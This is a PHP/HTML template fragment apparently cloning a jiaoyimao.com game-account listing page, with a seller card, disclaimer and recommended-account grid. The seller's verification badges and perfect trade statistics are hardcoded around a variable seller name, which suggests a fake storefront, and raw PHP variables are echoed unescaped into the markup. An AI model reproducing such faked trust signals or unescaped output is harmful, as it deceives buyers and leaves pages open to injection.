<div <?php echo $anquanxx001;?> class="item-section goldexp" data-card-name="security" data-spm="security" data-aplus-ae="x9_26683aac" data-spm-anchor-id="gcmall.goods_detail.0.security"><div class="item-section-header"><span class="title">安全信息</span></div>
  <div class="item-security-list clearfix"><div class="security-item"><div class="security-item-title">帐号绑定</div><div class="security-item-value">密保手机</div></div><div class="security-item"><div class="security-item-title">防沉迷</div>
    <div class="security-item-value">无</div></div></div></div>

        <div class="item-section item-seller-info-section goldexp goldclk" data-card-name="shop" data-spm="shop">
          <div class="item-seller-base-info">
            <div class="seller-info clearfix"><img src="https://static.jiaoyimao.com/resource/public/notice/2018/7/5/d15ffb9c-1b1e-4cb7-90e0-952427dd934d.png" class="avatar">
              <div class="seller-info-main">
                <div class="seller-name-level"><span class="nickname"><?php echo $_GoodsID['mingzi'];?></span><span class="seller-level"><span class="seller-level-inner"><i class="icon-level icon-level-star"></i></span></span></div>
                <div class="seller-tags">
                    <span class="seller-tag seller-tag-active">
                        <i class="jym-iconfontV2 jym-iconfontV2-goods-name"></i>
                        <span>已实名</span>
                    </span>
                    <span class="seller-tag seller-tag-active">
                        <i class="jym-iconfontV2 jym-iconfontV2-goods-people"></i>
                        <span>已实人</span>
                    </span>

                    <span class="seller-tag seller-tag-active"><i class="jym-iconfontV2 jym-iconfontV2-goods-zhima"></i><span>芝麻信用</span></span>
                </div>
              </div>
            </div>
          </div>
          <div class="seller-dynamic-info">
            <div class="seller-dynamic-item">
              <div class="seller-dynamic-item-value ">1</div>
              <div class="seller-dynamic-item-title">全部商品</div>
            </div>
            <div class="seller-dynamic-item">
              <div class="seller-dynamic-item-value ">100%</div>
              <div class="seller-dynamic-item-title">近7天成交率</div>
            </div>
            <div class="seller-dynamic-item">
              <div class="seller-dynamic-item-value ">0</div>
              <div class="seller-dynamic-item-title">交易纠纷记录</div>
            </div>
          </div>
        </div>
        <div class="item-section goldexp" data-card-name="exp_notice" data-spm="exp_notice">
          <div class="item-section-header"><span class="title">免责声明</span></div>
          <div class="item-text-intro">
            <div class="item-text-intro-content">
<ul class="text-list-intro"><li><span>1<!-- -->.</span>请勿私下联系卖家交易，防止被骗。</li><li><span>2<!-- -->.</span>所展示的商品供求信息由买卖双方自行提供，其真实性、准确性和合法性由信息发布人负责。</li><li><span>3<!-- -->.</span>买家付款后可与客服联系查看账号最新截图,商品信息真实性由卖家负责。因网易游戏和微信游戏特殊性，商品信息由卖家实时截图提供。</li><li><span>4<!-- -->.</span>国家法律规定，未成年人不能参与虚拟物品交易。</li><li><span>5<!-- -->.</span>本平台提供的数字化商品根据商品性质不支持七天无理由退货及三包服务。</li></ul>
            <div class="item-text-intro-buttons goldclk" data-spm="exp_notice"><a href="https://xuanchuan.jiaoyimao.com/p/q/k555wrmo?spm=gcmall.goods_detail.exp_notice.0" role="button" class="jym-button button-text-intro jym-button-primary jym-button-small jym-button-inline" aria-disabled="false"><span>安全学堂</span></a></div>
          </div>
        </div>
        <div class="item-section item-recommend-section">
          <div class="item-section-header recommend">
            <div class="recommend-title"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoBAMAAAB+0KVeAAAAJ1BMVEUAAAAJtv8Gtf8Gtf9Av/8HtP8GtP8Ftf8FtP8Stv8Gtv8FtP8Fs/8Thy4bAAAADXRSTlMAHKbmBE6E7f8OKpIvh9E0LgAAAERJREFUeAFjoC0YBYzKRgJwjmtaCJgW7+goZJi1EiIYvXsrmNbo6GhiWHMKIpi9exuYtujoaMYqiFU7VouwO4mqYBQAACP4GcWa02UtAAAAAElFTkSuQmCC" class="recommend-img"><span class="title">推荐商品</span><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoBAMAAAB+0KVeAAAAJ1BMVEUAAAAJtv8Gtf8Gtf8Ftf8FtP9Av/8HtP8GtP8FtP8Stv8Gtv8Fs/+phMkhAAAADXRSTlMAHKbm7f8EToSSDiovdkoZWwAAAEVJREFUeAFjoC4YBYzKRgIYgiKhoY5gRnpHGVxQNTQ0CMyonDkdIrJ6F4NpaGgwmN05cwZEcM9prIJYtWNYhHASTcEoAAB/uRbZfJWavQAAAABJRU5ErkJggg==" class="recommend-img"></div>
          </div>
          <div class="item-recommend-wrapper">
            <div class="am-list-view-scrollview">
              <div class="jym-flex-body ">
                <div class="list-view-section-body">
                  <div class="jym-waterfall-card jym-waterfall-card-left"><a href="https://m.jiaoyimao.com/item/1619689813111597.html?text=txt_gamedetail_tjl_po-1_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="0" data-show-page="1" data-a9="8" data-a10="false" data-a11="false" data-recid="a5dab8afaed0455e9dde0659f89546f860caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="x15_6fc9d07f" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x13_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/140009430.png&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span> 【102级】王烈
                            四套神器</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">500</span></span>
                            <div class="tabs-card-meta-favor">8人想要</div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-right"><a href="https://m.jiaoyimao.com/item/1623831801604779.html?text=txt_gamedetail_tjl_po-2_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="1" data-show-page="1" data-a9="0" data-a10="false" data-a11="false" data-recid="a27e2b3844b046c38cdf49cc431c737660caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="x16_6fc9d07f" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x14_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">微信苹果官方客户端/服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/161845468.jpg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span>
                            【65级】小号，刚注册没多</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">100</span></span></div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-left"><a href="https://m.jiaoyimao.com/item/1617781798042737.html?text=txt_gamedetail_tjl_po-3_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="2" data-show-page="1" data-a9="9" data-a10="true" data-a11="true" data-recid="0b43c389f66045f191d6e36da5f4e62160caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="x17_6fc9d07f" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x15_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/154245664.jpg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span>
                            【150级】3雷神cop，191v，贵九</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">3550</span></span>
                            <div class="tabs-card-meta-favor">9人想要</div>
                          </div>
                          <div class="tabs-card-meta-tags">
                            <div class="am-badge-group"><span class="am-badge ellipse bottom-item-tag am-badge-not-a-wrapper"><sup class="am-badge-text">协议保障</sup></span><span class="am-badge ellipse bottom-item-tag am-badge-not-a-wrapper"><sup class="am-badge-text">已投保</sup></span></div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-right"><a href="https://m.jiaoyimao.com/item/1622224440445611.html?text=txt_gamedetail_tjl_po-4_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="3" data-show-page="1" data-a9="1" data-a10="false" data-a11="false" data-recid="5a0abcf0ea2f4bc28f57a6fa18f9482760caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="x18_6fc9d07f" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x16_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/235808329.jpeg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span> 【100级】精品王魄号
                            可小刀</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">601</span></span>
                            <div class="tabs-card-meta-favor">1人想要</div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-right"><a href="https://m.jiaoyimao.com/item/1623907592327432.html?text=txt_gamedetail_tjl_po-5_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="4" data-show-page="1" data-a9="0" data-a10="true" data-a11="false" data-recid="ed688b80277c476b8e0e8a5dd26590c160caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="x19_6fc9d07f" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x17_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/131933927.jpg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span>
                            【104级】星象cop二十发妙才一套王怒</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">1400</span></span></div>
                          <div class="tabs-card-meta-tags">
                            <div class="am-badge-group"><span class="am-badge ellipse bottom-item-tag am-badge-not-a-wrapper"><sup class="am-badge-text">已投保</sup></span></div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-left"><a href="https://m.jiaoyimao.com/item/1621593511832699.html?text=txt_gamedetail_tjl_po-6_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="5" data-show-page="1" data-a9="16" data-a10="false" data-a11="false" data-recid="c237208110a040468f08ff21b107e9d160caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="x20_6fc9d07f" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x18_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/120952794.png&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span> 【131级】v8 百v
                            12王者幻神至尊套</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">2199</span></span>
                            <div class="tabs-card-meta-favor">16人想要</div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-left"><a href="https://m.jiaoyimao.com/item/1623648425915593.html?text=txt_gamedetail_tjl_po-7_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="6" data-show-page="1" data-a9="4" data-a10="false" data-a11="false" data-recid="49c0858dc1e049e181d8c6d039a2960660caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="x21_6fc9d07f" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x19_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/132233323.jpeg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span>
                            【138级】今晚20点正式下架</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">2888</span></span>
                            <div class="tabs-card-meta-favor">4人想要</div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-right"><a href="https://m.jiaoyimao.com/item/1623027976528818.html?text=txt_gamedetail_tjl_po-8_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="7" data-show-page="1" data-a9="2" data-a10="false" data-a11="false" data-recid="8603ad824037434c9926921d9801bd6160caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="x22_6fc9d07f" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x20_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/090204855.jpeg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span> 【150级】满级150
                            苹果QQ账号</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">1599</span></span>
                            <div class="tabs-card-meta-favor">2人想要</div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-left"><a href="https://m.jiaoyimao.com/item/1623860468185769.html?text=txt_gamedetail_tjl_po-9_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="8" data-show-page="1" data-a9="0" data-a10="false" data-a11="false" data-recid="dd5d6cc59e47465caedc8936f038641660caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="23" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x21_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/001824884.jpeg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span> 【98级】急需用钱
                            ，非常好的号</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">700</span></span></div>
                        </div>
                      </div>
                    </a></div>

                  <div class="jym-waterfall-card jym-waterfall-card-left"><a href="https://m.jiaoyimao.com/item/1623377765035692.html?text=txt_gamedetail_tjl_po-11_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="10" data-show-page="1" data-a9="5" data-a10="false" data-a11="false" data-recid="d4ae7126734a4f4f8771094e2eab87b060caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="25" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x23_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/101456121.png&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span>
                            【55级】堡垒小号喜欢的看一下</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">25</span></span>
                            <div class="tabs-card-meta-favor">5人想要</div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-right"><a href="https://m.jiaoyimao.com/item/1623757571933783.html?text=txt_gamedetail_tjl_po-12_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="11" data-show-page="1" data-a9="3" data-a10="true" data-a11="false" data-recid="3e3cdec01664430fa868e84fd899b36760caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="26" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x24_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/194236111.jpg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span> 【103级】60v
                            退游低价甩</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">500</span></span>
                            <div class="tabs-card-meta-favor">3人想要</div>
                          </div>
                          <div class="tabs-card-meta-tags">
                            <div class="am-badge-group"><span class="am-badge ellipse bottom-item-tag am-badge-not-a-wrapper"><sup class="am-badge-text">已投保</sup></span></div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-left"><a href="https://m.jiaoyimao.com/item/1620478563791587.html?text=txt_gamedetail_tjl_po-13_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="12" data-show-page="1" data-a9="9" data-a10="true" data-a11="true" data-recid="c2b9ce8b06c34fbfa2b890045fcb569a60caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="27" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x25_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/150742517.jpeg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span>
                            【150级】V9退游账号15王者便宜出售</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">3500</span></span>
                            <div class="tabs-card-meta-favor">9人想要</div>
                          </div>
                          <div class="tabs-card-meta-tags">
                            <div class="am-badge-group"><span class="am-badge ellipse bottom-item-tag am-badge-not-a-wrapper"><sup class="am-badge-text">协议保障</sup></span><span class="am-badge ellipse bottom-item-tag am-badge-not-a-wrapper"><sup class="am-badge-text">已投保</sup></span></div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-right"><a href="https://m.jiaoyimao.com/item/1623769284173877.html?text=txt_gamedetail_tjl_po-14_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="13" data-show-page="1" data-a9="10" data-a10="true" data-a11="true" data-recid="0f22fd39fb0c4550952050e0d26a492960caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="28" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x26_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/225917035.jpg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span>
                            【102级】幻神贱卖加王者多多 王湿一套</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">1750</span></span>
                            <div class="tabs-card-meta-favor">10人想要</div>
                          </div>
                          <div class="tabs-card-meta-tags">
                            <div class="am-badge-group"><span class="am-badge ellipse bottom-item-tag am-badge-not-a-wrapper"><sup class="am-badge-text">协议保障</sup></span><span class="am-badge ellipse bottom-item-tag am-badge-not-a-wrapper"><sup class="am-badge-text">已投保</sup></span></div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-left"><a href="https://m.jiaoyimao.com/item/1622189909618327.html?text=txt_gamedetail_tjl_po-15_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="14" data-show-page="1" data-a9="18" data-a10="false" data-a11="false" data-recid="24fe578a75a04c2780e803255068b79960caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="29" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x27_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/161635670.jpeg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span> 【82级】王怒火麒麟
                          </div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">600</span></span>
                            <div class="tabs-card-meta-favor">18人想要</div>
                          </div>
                        </div>
                      </div>
                    </a></div>

                  <div class="jym-waterfall-card jym-waterfall-card-left"><a href="https://m.jiaoyimao.com/item/1619374515890034.html?text=txt_gamedetail_tjl_po-17_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="16" data-show-page="1" data-a9="13" data-a10="false" data-a11="true" data-recid="53f2e34990854fba849b9c2e5ff1344a60caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="31" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x29_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/141120412.jpeg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span> 【120级】v9
                            180v王者荣耀234皮</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">3500</span></span>
                            <div class="tabs-card-meta-favor">13人想要</div>
                          </div>
                          <div class="tabs-card-meta-tags">
                            <div class="am-badge-group"><span class="am-badge ellipse bottom-item-tag am-badge-not-a-wrapper"><sup class="am-badge-text">协议保障</sup></span></div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-right"><a href="https://m.jiaoyimao.com/item/1623841396495640.html?text=txt_gamedetail_tjl_po-18_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="17" data-show-page="1" data-a9="0" data-a10="false" data-a11="false" data-recid="29182d0f84f34e37ad7cc5e353e0c6aa60caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="32" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x30_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/185522437.png&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span>
                            【103级】王翼黑骑士双喷妙才套</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">899</span></span></div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-left"><a href="https://m.jiaoyimao.com/item/1623290246356027.html?text=txt_gamedetail_tjl_po-19_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="18" data-show-page="1" data-a9="9" data-a10="false" data-a11="false" data-recid="1505df8662c441d8b69e5c7f4bdd331360caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="33" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x31_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/095058145.jpeg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span>
                            【84级】王击星象火麒麟套超值显血小号</div>
                          <div class="tabs-card-meta-price"><span class="format-price "><span class="currency-symbol price-12">￥</span><span class="integer-part price-20">735</span></span>
                            <div class="tabs-card-meta-favor">9人想要</div>
                          </div>
                        </div>
                      </div>
                    </a></div>
                  <div class="jym-waterfall-card jym-waterfall-card-right"><a href="https://m.jiaoyimao.com/item/1620662333139699.html?text=txt_gamedetail_tjl_po-20_goods">
                      <div class="render-card-item goldexp goldclk" data-card-name="recommend" data-spm="recommend" data-show-num="19" data-show-page="1" data-a9="3" data-a10="false" data-a11="false" data-recid="9c0edb2ce92447f7a8def87769fd91be60caf58f" data-ref-task-id="2e0dd73c3ccc-4dbc-87e4-c86a7a35e0fd" data-aplus-ae="34" data-spm-anchor-id="gcmall.goods_detail.0.recommend" data-aplus-clk="x32_4062e211">
                        <div class="tabs-card-cover">
                          <div class="tabs-card-cover-tag">
                            <div class="tabs-card-cover-tag-bg"><i class="jym-iconfontV2 jym-iconfontV2-ios"></i><span class="r-tag">QQ苹果官方客户端/苹果QQ服务器</span></div>
                          </div>
                          <div class="img-div tabs-card-img jym-img-opc jym-img-opc-1" style="background-image: url(&quot;image/124739808.jpg&quot;);">
                          </div>
                        </div>
                        <div class="tabs-card-body">
                          <div class="tabs-card-meta-title"><span class="pid-badge pid-badge-blue">帐号</span> 【138级】8王者
                            快v9了111英雄武器</div>
